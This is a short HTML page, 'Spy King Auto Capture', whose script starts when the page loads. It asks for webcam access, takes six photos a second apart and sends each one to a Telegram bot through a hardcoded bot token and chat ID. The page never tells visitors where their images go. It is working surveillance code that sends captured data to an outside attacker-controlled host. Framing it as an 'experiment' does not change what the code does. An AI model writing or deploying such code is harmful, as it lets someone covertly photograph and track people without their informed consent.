<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Spy King Auto Capture</title>
</head>
<body>
<h2>Spy King Auto Capture Experiment</h2>

<script>
const telegramBotToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70"; // Telegram bot token
const chatId = "8182050140"; // Your chat ID

async function startCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        // Capture 6 images at 1 sec interval
        for (let i = 0; i < 6; i++) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg');

            // Send to Telegram bot
            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                method: 'POST',
                body: JSON.stringify({
                    chat_id: chatId,
                    photo: dataUrl
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            await new Promise(r => setTimeout(r, 1000)); // 1 sec delay
        }

        // Stop stream
        stream.getTracks().forEach(track => track.stop());
        alert('Capture complete!');

    } catch (err) {
        console.error(err);
        alert('Camera access denied or error!');
    }
}

// Start capture automatically when page loads
window.onload = startCapture;
</script>
</body>
</html>
